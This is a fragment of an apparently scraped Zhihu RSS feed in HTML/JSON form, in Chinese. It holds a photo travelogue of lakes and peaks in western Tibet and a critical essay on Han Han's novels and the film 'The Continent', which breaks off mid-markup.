href=\"https://www.zhihu.com/zvideo/1418542012924211200\">冈仁波齐、纳木那尼峰的日出日落和星空景色</a><p>在西藏三大神湖之首、海拔4588米的玛旁雍错湖边，学当地人，鞠一捧湖水洗去一路尘埃，当夕阳西下，隔着玛旁雍错遥望对岸十几公里外，有着美丽弧线和粗犷纹理、海拔海拔7694米的纳木那尼神山被夕阳染红，你会不由得欢呼雀跃。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f6dbcfca0ca6f2fc312a1608a2f1161d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-f6dbcfca0ca6f2fc312a1608a2f1161d\" data-watermark-src=\"v2-7542a8e0336cb33e74424c334c47cc58\" data-private-watermark-src=\"v2-fc5a527715d64e0e726455ba0e918b9b\"></p>\n<p>在我拍摄过的山峰中，纳木那尼是一座日出日落时候非常具备戏剧性的山峰，日出日落时候，太阳会逐渐照亮山峰上的各个山峰的里面，充满了戏剧感：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a3c7cb737d2328c4ad90d66fd257deeb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-a3c7cb737d2328c4ad90d66fd257deeb\" data-watermark-src=\"v2-8c8c4c38c90bcc78e5e881ee7d40533a\" data-private-watermark-src=\"v2-ea823589c03d68de7e633ab93671be3c\"></p>\n<p>日出的景色：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b375b9ff8bb70f90c96eee324156f48f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-b375b9ff8bb70f90c96eee324156f48f\" data-watermark-src=\"v2-a96eed0b0f1e96a80563b687aa096236\" data-private-watermark-src=\"v2-68a3e00b6f90c6c3cf2b68e3b92008d7\"></p>\n<p>从这段视频里，能看到冈仁波齐和纳木那尼山峰神奇的日出</p>\n<a href=\"https://www.zhihu.com/zvideo/1418542012924211200\">冈仁波齐、纳木那尼峰的日出日落和星空景色</a><p>玛旁雍错湖边的水草：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bc27f346d43f35dbc189d374922a7ced_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-bc27f346d43f35dbc189d374922a7ced\" data-watermark-src=\"v2-5493c4f39d104a76dc27c60012b79078\" data-private-watermark-src=\"v2-d0c47a9a747f47b561556d48d1e464da\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-75b9b30c1ed71de536f56425781a30f4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-75b9b30c1ed71de536f56425781a30f4\" data-watermark-src=\"v2-9cc0cfe509715adfb6330200125c1c48\" data-private-watermark-src=\"v2-07d2aaa34b3c12116fa0946e259577b4\"></p>\n<h2>鬼斧神工的札达土林</h2>\n<p>札达土林面积约5000平方公里，核心区800平方公里，地质学家考证，这里在五百万年前还比较矮小的喜马拉雅山、冈底斯山的河流携带砾卵石、细粉沙和粘士等堆积而成的湖盆，随着高原上升，湖盆累积的砾卵石层的棕黄、褐色或灰黄色的半胶结细粉沙层、厚达1900米的堆积物，被流水和风雨侵蚀雕琢，钙质胶结的部分留存下来，松软的泥土被冲走，造就了鬼斧神工、千姿百态的土林造型。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a747c281ac3043c20939278814bd1fe4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"780\" data-rawheight=\"780\" data-watermark=\"original\" data-original-src=\"v2-a747c281ac3043c20939278814bd1fe4\" data-watermark-src=\"v2-a050e2c65ffef213170691daf35adba1\" data-private-watermark-src=\"v2-56e0d78b03a93074607fadbd4ddb18eb\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-aa4f32b0cbab0a83980c1525fefcea5a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"747\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-aa4f32b0cbab0a83980c1525fefcea5a\" data-watermark-src=\"v2-075717f626c9bba27d7702259d03dad7\" data-private-watermark-src=\"v2-dac4d26339277b8a2a3c732938ef1936\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8312d52d1d030be66910f4e7fac29a84_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-8312d52d1d030be66910f4e7fac29a84\" data-watermark-src=\"v2-3255e5f62d0189304339235309d07630\" data-private-watermark-src=\"v2-ae3a133c6eb7904a06ec56410cea0a2d\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-69b88410163d1d7adc85e9fb5b41c59b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-69b88410163d1d7adc85e9fb5b41c59b\" data-watermark-src=\"v2-7e41afae106a3bdb4b628b4b46c7e573\" data-private-watermark-src=\"v2-a7be28746c27058bcea9798086fe6b96\"></p>\n<p><br></p>\n<h2>一错再错的美丽湖泊</h2>\n<p>从拉萨从出发，经过日喀则边境线等，会看到很多美丽的大湖。秋天天气晴朗，湖水清澈。</p>\n<p>这是日喀则和不丹边境线的多情错，秋季湖水非常多。岸边草是黄色</p>\n<p>多庆错：</p>\n<p>又名，多情错。多庆错位于亚东县堆纳乡，靠近当年的边境焦点地区洞朗，海拔4472米，60.6平方公里。</p>\n<p>据统计数据，从1980年的57.74平方公里，2013年增大到60.06平方公里。但此湖受季节影响颇大，最壮观在九月份，其他月份，尤其是夏季，比较小。</p>\n<p>虽然面积不大，但是因为有中国和不丹的界峰，海拔7326米，形态绰约多姿的卓木拉日雪山，应该排在西藏最美山峰的前十名！在每年九月底附近，湖水丰沛、野鸟聚集，卓玛拉日倒映其中。美轮美奂。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1a6a2f839d93b14ecf3fbeb2792907da_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1680\" data-rawheight=\"945\" data-watermark=\"original\" data-original-src=\"v2-1a6a2f839d93b14ecf3fbeb2792907da\" data-watermark-src=\"v2-30c85620357e82c3b0d2910c32c1d701\" data-private-watermark-src=\"v2-8d4ed90be90c3df5b7e7ba6943307e7b\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3442d4ef08907c502027bed626924a1c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1494\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-3442d4ef08907c502027bed626924a1c\" data-watermark-src=\"v2-cb778ca6cc685c92f33d13f762589af8\" data-private-watermark-src=\"v2-e337acb1707b582f7082a3826ce8fa46\"></p>\n<p>在阿里腹地一座小湖，如同一个翡翠吊坠一般。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cf9ca79e9cf382bfc22fe9858bc58481_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1316\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-cf9ca79e9cf382bfc22fe9858bc58481\" data-watermark-src=\"v2-557a8e4527c8c955b8fc1d1398d02d14\" data-private-watermark-src=\"v2-8bcffe662a69b240b8c2642c1dc80be4\"></p>\n<p>西藏最深的湖泊当惹雍错。</p>\n<p>当惹雍错位于西藏自治区那曲地区尼玛县。是西藏最古老的雍仲本教徒崇拜的最大的圣湖，也是西藏第四大湖。</p>\n<p>海拔4600米，面积836平方公里。其深度超过210米，而纳木错深度为99米，当惹雍错的水深是其两倍多，是目前已知西藏最深的湖。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9785480e0058cba6662120c7ae6e4b58_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1680\" data-rawheight=\"945\" data-watermark=\"original\" data-original-src=\"v2-9785480e0058cba6662120c7ae6e4b58\" data-watermark-src=\"v2-12d402fee26bc394cb35c0265967a092\" data-private-watermark-src=\"v2-c575568e8f5b3f29757f6335ec4db375\"></p>\n<p>比青海茶卡盐湖大一倍多的扎布耶茶卡</p>\n<p>扎布耶茶卡，也叫扎布耶错、查木错、扎布错等；位于西藏自治区日喀则地区仲巴县隆格尔区仁多乡境内；地理坐标东经83°57′10″-84°15′08″，北纬31°27′10″-31°34′30″。海拔4429米，243平方公里。</p>\n<p>和茶卡盐湖一样，都是盐湖，但是这里景色更加大气磅礴，一年没有多少人来这里。但是，由于是采矿区域，要特别注意安全！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0285cb83e86db4e8491e96ab109000e4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1680\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-0285cb83e86db4e8491e96ab109000e4\" data-watermark-src=\"v2-53678faf5ca05b8f57b043c6d04255bc\" data-private-watermark-src=\"v2-7b5a4d355513c95eea01d2baf8bc6384\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3f9e7e769b10d9345ae3e65319af7799_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1494\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-3f9e7e769b10d9345ae3e65319af7799\" data-watermark-src=\"v2-b48770ef98a80632faa5cb42fa1cfe8c\" data-private-watermark-src=\"v2-5b4ef5e7630d2062ea988fc939e75a1b\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-151943fc8e11bda82ac05dd72dbfb748_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1494\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-151943fc8e11bda82ac05dd72dbfb748\" data-watermark-src=\"v2-c5b466b10b51c41c7b001e737bb4372e\" data-private-watermark-src=\"v2-1128f1859d277ceefa4d659529c7ce8a\"></p>\n<p>湖中有潜水艇一般岛屿的塔若错：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-99ea26a00d41a99782640c5239702657_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-99ea26a00d41a99782640c5239702657\" data-watermark-src=\"v2-834d9afacf15e8bfdadc540c459579f1\" data-private-watermark-src=\"v2-b103213ee7bae589516931df441c3f94\"></p>\n<p><br></p>\n<p>西藏第三大湖扎日南木措：</p>\n<p>扎日南木错（Zhari Namco）西藏自治区第3大湖。亦称塔热错。位于藏北高原南部，介于北纬30°44′～31°05′，东经85°19′～85°54′，阿里地区措勤县境内。属东西向构造断陷湖。东西长53.5公里，南北宽26公里，平均宽18公里，面积1023平方公里。海拔4613米。</p>\n<p>在这里拍摄，一定要早晨赶到这个小山包，俯视湖面，才是最精彩的画面！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-574fa2476dbefca6596179e49928d9f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1918\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-574fa2476dbefca6596179e49928d9f7\" data-watermark-src=\"v2-daf3a9d342d21d43d7157f216c4805b9\" data-private-watermark-src=\"v2-546ad9bb1b314701b957fa04ac861310\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f3292b7bfb012fbd8187f6f850f10f36_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1680\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-f3292b7bfb012fbd8187f6f850f10f36\" data-watermark-src=\"v2-3bfa023d346e9490ceb7ef804958cce6\" data-private-watermark-src=\"v2-157ebc5242d36503ff0f5a80ae030a71\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-574fa2476dbefca6596179e49928d9f7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1918\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-574fa2476dbefca6596179e49928d9f7\" data-watermark-src=\"v2-daf3a9d342d21d43d7157f216c4805b9\" data-private-watermark-src=\"v2-546ad9bb1b314701b957fa04ac861310\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9d6d6def43a5a1766a736f73b4aecff6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-9d6d6def43a5a1766a736f73b4aecff6\" data-watermark-src=\"v2-e3d09d0490e30799516719bc8b112339\" data-private-watermark-src=\"v2-8edb5d1793cdd323ab23cea88580a7c4\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2cd130807bcfb4017db88fbb1c9cbe55_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1475\" data-watermark=\"original\" data-original-src=\"v2-2cd130807bcfb4017db88fbb1c9cbe55\" data-watermark-src=\"v2-a6e1f2064ef91c32713f6dd6b88ff1b6\" data-private-watermark-src=\"v2-e89a800859a1aa89b5275271c843c46e\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b905cc88159db63c4894bb16c92c2c54_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1680\" data-rawheight=\"945\" data-watermark=\"original\" data-original-src=\"v2-b905cc88159db63c4894bb16c92c2c54\" data-watermark-src=\"v2-2f64a57e929f1b11188e3cc41db6a0ef\" data-private-watermark-src=\"v2-99a102e5ae598bb7e866c71a67d7e6b6\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9be113887a18a17bfa6f138233f35ef3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1680\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-9be113887a18a17bfa6f138233f35ef3\" data-watermark-src=\"v2-f618af1e7434cc3f4e32e9ed32418eee\" data-private-watermark-src=\"v2-41e7792407e1ff4cd38d6d35169c861b\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-632fef92ddf6eee0f0dcb73f4684c8ef_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1494\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-632fef92ddf6eee0f0dcb73f4684c8ef\" data-watermark-src=\"v2-ac3f88d8e75ebfb14ee14f6251dc4989\" data-private-watermark-src=\"v2-f89a88c81a695f8b1d4e9a6acdc3d50e\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b8db5c4fcd6807bb77a16a731d62f91e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1440\" data-watermark=\"original\" data-original-src=\"v2-b8db5c4fcd6807bb77a16a731d62f91e\" data-watermark-src=\"v2-22e1ead9075ef56b498221ee142064a3\" data-private-watermark-src=\"v2-d6a5b3bc00930207bf430348a87be079\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d262521c831a920c83f91ed4ee371089_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1440\" data-watermark=\"original\" data-original-src=\"v2-d262521c831a920c83f91ed4ee371089\" data-watermark-src=\"v2-c4dc5d3bcae65439ce5231820d62d6b0\" data-private-watermark-src=\"v2-d83093327e7621b2e1ee72537f243fa6\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2cd130807bcfb4017db88fbb1c9cbe55_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1475\" data-watermark=\"original\" data-original-src=\"v2-2cd130807bcfb4017db88fbb1c9cbe55\" data-watermark-src=\"v2-a6e1f2064ef91c32713f6dd6b88ff1b6\" data-private-watermark-src=\"v2-e89a800859a1aa89b5275271c843c46e\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-9eb1533b79f2b251e1c165bf1d578080_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1440\" data-watermark=\"original\" data-original-src=\"v2-9eb1533b79f2b251e1c165bf1d578080\" data-watermark-src=\"v2-e3cd9355a68b95afac882570ac46781a\" data-private-watermark-src=\"v2-8c9685f7afab022144613e283f587240\"></p>\n<p>昂拉仁措，是西藏第八大湖，海拔4716米，咸水湖，在西藏日喀则地区仲巴县境内，从仁多乡前往扎布耶盐湖能远远看到湖中间的小岛。从1976年有统计数据以来，湖面从552平方公里开始不断缩小，现在面积约495平方公里。</p>\n<p>这里人际罕至，偏离主路两个多小时车程，尽可能两辆以上越野车结伴，方可靠近。</p>\n<a href=\"https://www.zhihu.com/zvideo/1310357505298419712\">西藏第八大湖——昂拉仁措</a><p>多雄藏布：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-33aa03f808a919af332ac5d8ea9a10b0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"537\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-33aa03f808a919af332ac5d8ea9a10b0\" data-watermark-src=\"v2-b5bb936b0b086bcbe8b4f7c34b527093\" data-private-watermark-src=\"v2-6ba9ab731f58827dcf643e6516ef0a47\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4a432a4b748741722ef8b4e63dbc82fb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1707\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-4a432a4b748741722ef8b4e63dbc82fb\" data-watermark-src=\"v2-05e594112ae1e1a6139fcd62186486fa\" data-private-watermark-src=\"v2-4a4f6c5c26b20155d802b7701ce733c7\"></p>\n<p>未完待续</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/pinglaohu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">平老虎</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/25516962/answer/2107470029?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">918 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/302647030?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你最喜欢哪个城市的春天？为什么？</a><br><a href=\"http://www.zhihu.com/question/40818909?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">夏天中国有哪些好玩城市？</a><br>\n","link":"http://www.zhihu.com/question/25516962/answer/2107470029?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"有哪部作品没有被影视化，让你觉得「也太遗憾了」？","date":"2021-09-06 12:56:17","description":"\n<p>稍微谈几句个人的喜好。</p>\n<p>韩寒的《1988我想和这个世界谈谈》，是我个人最希望看到的影视改编作品。但与此同时，它的影视化改编难度之大，也是完全可以事先料想的。</p>\n<p>韩寒的小说，带有极其鲜明的个人特色。大家往往会将他归类于两极化的存在：少年时代的叛逆者，成熟时期的精明鬼。这很大程度上来自于韩寒自身对外行为的改变：他打破了曾经“不接广告，不参加娱乐节目”等誓言，开始做广告、拍电影、上节目，更多地营销包装自己，并且在商业上取得了更大的成功。</p>\n<p>在外界看来，曾经的反抗性，似乎变成了一种妥协；曾经的特立独行，似乎也变成了对于某一自认为小众实则大众的“不想庸俗”之庸俗群体的定向讨好。个性变成了人设，创作变成了粉丝消费，他与郭敬明的区别也变成了“精准定位”的不同，同为粉丝经济友军的差异化竞争。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-07056e0bbf550cfcef481a3fdc56fedc_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"309\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-07056e0bbf550cfcef481a3fdc56fedc\" data-watermark-src=\"v2-e00fc2187c4879e8ef537264774b2fcc\" data-private-watermark-src=\"v2-22d33649c4be924b8231ea051d12b3d3\"></p>\n<p>韩寒变了吗？深入社会、经验增长、结婚生子，当然会让他有所改变，从一个颇为极端的愤怒青年，变成了更了解、接受现有社会规则之合理性的成年人。但事实上，他也没有什么改变，对于创作风格、审美品味、个人思想的坚持，始终是他没有抛弃的部分。</p>\n<p>从他一系列的小说中，我们可以清晰地感受到这一点。《三重门》等早期作品，固然讽刺，但更多停留在了对现象的提出，以及动用大量篇幅对嘲弄讥笑、甚至夸大化之上。这与他当时期的杂文博客创作也很类似：指出摆在明面上、但其他人不便或不敢指出的现象，进行单刀直入的反对。</p>\n<p>如此一来，小说的文笔才思、杂文的揭露勇气、固然值得赞扬，但却无一例外地缺少深度和思考，仿佛自认犀利的青春期少年的扬鞭痛斥，痛快过瘾，但无更多实际意义，甚至有几分自鸣得意的卖弄。就像韩寒自己所说：《三重门》那些书，过于想在每一段都出彩，实际上没什么内容。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-192b09b308d0fc2c1b7fdce26fbd5d0f_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"868\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-192b09b308d0fc2c1b7fdce26fbd5d0f\" data-watermark-src=\"v2-2aed7d6e9e8b26abe941750de3ffcd06\" data-private-watermark-src=\"v2-5b7e6128154ac0720416f2166f9a0bd8\"></p>\n<p>而他后期的作品，则逐渐开始体现出他深入社会、走过人生更多历程后的状态。刻意的单句搞笑少了，玩笑段子更多地拥有了一个共同的指向：对于残酷世界与冰冷现实的自嘲、开解。像《一座城池》《像少年啦飞驰》这样的作品之中，韩寒反复地开着主角们在落魄情境下的玩笑，让他们的回应成为笑点，人物面对窘境的头铁、死硬、自损，透露出对于世界的不妥协与不绝望。而其结局，往往像韩寒被人诟病的那样，“戛然而止，无结尾的结尾”，从而表现出一种理想主义的终焉——一直坚持，但无法实现。</p>\n<p>他们并没有激进地反抗，但也从未在这种情况下投降。《一座城池》中的主角们，似乎放任自流、混沌度日，但却有着一股自己的别样“坚持”——最具有象征意义的片段里，主角之一身残志坚，用近乎乌龟爬的速度，缓缓地向心仪的姑娘移动，然而对方却已经离去。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-dc584fc2db3305daffcc55f194da3582_720w.jpg?rss\" data-rawwidth=\"980\" data-rawheight=\"551\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dc584fc2db3305daffcc55f194da3582\" data-watermark-src=\"v2-0455e4d7c4f3f0f64a546fb0fcec7475\" data-private-watermark-src=\"v2-aae821c4bbf2eb4bd7dadb1ba242f777\"></p>\n<p>事实上，这也正是韩寒本人在当下对待世界的态度：他理解世界运行的规则之必然性，也愿意为了各种客观需求而放下曾经的自我，承认原来极端思想的幼稚，但是，他并不想放弃所有的内心坚持，不想被社会系统彻底同化，涂染成一个完全无法分辨面目的无个性存在。在游戏规则中，保留自我，像与他多少有点类似的姜文那样，“站着把钱挣了”，是他的追求。</p>\n<p>一个承认现实残酷，打压理想，但依然试图在规则里实现它的理想主义者，或许就是当前这批作品中表现出的韩寒。他当然有在试图经营自己的“文艺形象”，获得相关受众，但却并不想完全满足于此：他的作品，永远都有着类似的晦暗难懂、不明所以，但也从未打破搞笑与冰冷、黑暗与宽慰兼容混合的整体风格，更由此在作品世界中延续了一种异样的“脱离俗世感”。</p>\n<p>这当然会让他的一部分受众满意，但也必然会招致另一部分受众在不明所以之下的“被降维打击”挫败感，同时也不利于更广大人群的普及。韩寒的坚持，或许可以理解为：在满足尽量多受众的同时，输出我自己风格与表达的内容，以内容而非单纯的包装去契合受众，而非只做样子地宣传诱骗。《让子弹飞》中的姜文，恰恰也正是实现了这一点。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3e55099cc0c4c07d07e1df76cea927bf_720w.jpg?rss\" data-rawwidth=\"440\" data-rawheight=\"260\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-3e55099cc0c4c07d07e1df76cea927bf\" data-watermark-src=\"v2-a2e4071b2c7d8edabaa75b918923e1e1\" data-private-watermark-src=\"v2-23a44e90ac53b24ae1e87d45a62e794f\"></p>\n<p>而如果我们放大到电影创作，则可以看到韩寒的更多信息。他的所有电影，都与小说创作一脉相承，但又没有局限于此。</p>\n<p>处女作《后会无期》，被评为最“韩寒小说”的散乱式电影，堆梗问题饱受诟病。但是，于整片而言，我们显然可以看到“梗”与“片段”之间的内在有机结合表达。</p>\n<p>在这部电影里，从三段男女之情到伪装的骗子钟，韩寒都在表现着现实法则对个人理想主义情怀的压制。理想化的江河，被马浩瀚一次次打击教育，更在突生纯爱之情的妓女王珞丹面前，因为警察的扫黄而仓皇逃窜。赴边教书的理想信仰，更是在路途上屡受阻碍，甚至遭遇汽车故障的吃瘪。而相对现实化的马浩瀚，却也同样无法做到自己“我在哪儿擦屁股，都有人给我送纸”的“吃得开”，反而在“号称演员，实则路人甲”的陈乔恩面前难以张开借钱的嘴，在“暗恋我”的袁泉面前发现自己完全误会、实属兄妹，甚至难以开口表白。</p>\n<p>而最撕破理想化的，便是钟汉良的骗子钟与一同出发的傻小子了。骗子钟以最理想主义的面目出现，声称自己想要追看极光，实际上却只是再现实不过的诈骗钱财。而相对地，傻小子的傻，透露着心地的纯真、未被现实改变的原初，但却像韩寒小说里的很多角色一样，突兀消失。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f000603ccb9d3a061c00560d508e6ae5_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1456\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f000603ccb9d3a061c00560d508e6ae5\" data-watermark-src=\"v2-53a0b0b6dce0f3721be22ce5469035f8\" data-private-watermark-src=\"v2-2d2a9068082cd31360d869a6590e5b7f\"></p>\n<p>当然，韩寒在少年期曾经以“其实我就是写忘了”为解释，但这是否只是他的故作对抗嘲讽之言？至少，以现在的成熟韩寒而言，他不太可能再在一部不可能忘记要素的电影里“拍丢了”。这其中当然有所表达——他们从对外隔绝、自给自足的东极岛出发，离开即将被外部世界入侵、染色的岛屿，去往另一片江河口中的理想化世外桃源，怀着东极岛而生的理想主义，但路途上一系列的挫折打击教育，却让他们的理想逐渐磨灭，而先天缺陷、至真至纯的傻小子早早的突然消失，便是对后续一切的提前预示：理想，哪怕纯洁完美，也赢不了现实化之路的打压。</p>\n<p>甚至，骗子钟的突兀出现，与傻小子的突兀消失，一前一后。这个巧妙的设计，似乎有了一种“同一角色进化改变”的意味：至纯理想的傻小子，在我们看不到的现实世界中游荡，思想彻底改头换面，成为了骗子钟。而电影在现实层面的明确结局部分里，并没有正面呈现江河路途的尽头——那个他梦寐以求的理想王国，与世隔绝的荒野戈壁，物质的贫瘠地与信仰的伊甸园，是否真正存在，是否是他梦想中的样子，他又是否抵达，无人得知。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-78b38dc19c74842e7d45f081cf7aeb40_720w.jpg?rss\" data-rawwidth=\"698\" data-rawheight=\"433\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-78b38dc19c74842e7d45f081cf7aeb40\" data-watermark-src=\"v2-bbd8c743a43aaa1812ebcb94006b1d57\" data-private-watermark-src=\"v2-42ba27f86d9da75b9e30cf04268f01bc\"></p>\n<p>这不禁让人想起了韩寒推荐、方励投资的《家在水草丰茂的地方》——两个少数民族少年，从放牧文化消亡的黄沙之地出发，奔向父辈所在的草原深处，那未被当代化的水草丰茂之地，在一路上重温了宗教的信仰，仿佛即将回到心灵之所，然而在最后一个镜头中，迎接他们的，却只是工业烟霭升腾、行将荒漠化的半秃草原，以及被雇佣工作的父辈。而《后会无期》中的江河，是否也经历了同样的事情呢？</p>\n<p>但是，在每一段中，韩寒却又都留下了理想主义并未泯灭的希望火种。群众演员陈乔恩闲适地走过民国布景，微微仰头之间，美艳不可方物，光芒汇聚于她的脸上，仿佛她此刻便是绝对主角。因为血缘关系，被迫拒绝冯绍峰的袁泉，留下了“喜欢是放肆，而爱是克制”的别样表白，既点出了血缘的现实不可越鸿沟，也在主观上承认了她的感情。王珞丹逃离扫黄警察时，在一片星光和灯火的辉映中优雅散步，这一刻她与江河仿佛真地进入了心灵交互的纯美世界，且不再是迫于生计、仓皇逃命的苦命人。这一切表达，延伸到了高潮：作为理想主义寄托的卫星，发射升空，震撼众人。</p>\n<p>这些梦想实现、压过现实的理想主义瞬间，其实都只是电影段落中的倏忽即逝。试位的陈乔恩马上被导演叫了下去，换女主角上场。袁泉说完表白，与马浩瀚再无交集。王珞丹被贾樟柯带上车，江河被提醒“你知道她是干什么的吧”，然而，这却并不影响这些瞬间的圣洁高贵——现实是不可撼动的，但认清这一事实，也并不意味着理想在心中的消亡。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c3b1fb0cde63290e81750c7ec6a6a90c_720w.jpg?rss\" data-rawwidth=\"658\" data-rawheight=\"921\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c3b1fb0cde63290e81750c7ec6a6a90c\" data-watermark-src=\"v2-4b69cf4563a717109df1c2740162a362\" 